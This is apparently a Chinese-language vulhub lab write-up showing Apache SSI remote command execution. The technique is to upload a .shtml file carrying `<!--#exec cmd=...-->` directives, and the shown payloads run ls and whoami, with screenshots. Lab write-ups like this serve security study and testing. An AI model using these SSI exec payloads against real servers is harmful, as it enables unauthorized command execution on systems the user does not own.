## Apache SSI 远程命令执行漏洞

###### by ADummy

### 0x00利用路线

​			上传shtml文件--->任意命令执行

### 0x01漏洞介绍

​			在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用`<!--#exec cmd="id" -->`语法执行任意命令。

##### 			什么是SSI？

​			SSI即server-side includes，SSI提供了一种对现有HTML文档增加动态内容的方法，不需要编写复杂的JSP/PHP/ASP等程序或者调用CGI程序。

##### 			影响版本

```
apache httpd 全版本
```

### 0x02漏洞复现

##### **PAYLOAD:**

```
<!--#exec cmd="ls" -->
```

```
<!--#exec cmd="whoami" -->
```

​			**上传页面**![Apache_SSI_远程命令执行漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_SSI_远程命令执行漏洞_1.jpg)

​			**上传1.shtml文件**

![Apache_SSI_远程命令执行漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_SSI_远程命令执行漏洞_2.jpg)



​			**访问刚才上传的`/1.shtml`查看上传的文件,ls被执行**

![Apache_SSI_远程命令执行漏洞_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_SSI_远程命令执行漏洞_3.jpg)









​			**上传2.shtml文件**

![Apache_SSI_远程命令执行漏洞_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_SSI_远程命令执行漏洞_4.jpg)

​			**whoami被执行**

![Apache_SSI_远程命令执行漏洞_5](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Apache_SSI_远程命令执行漏洞_5.jpg)





​			

### 0x03参考资料

https://blog.csdn.net/qq_43571759/article/details/105883455



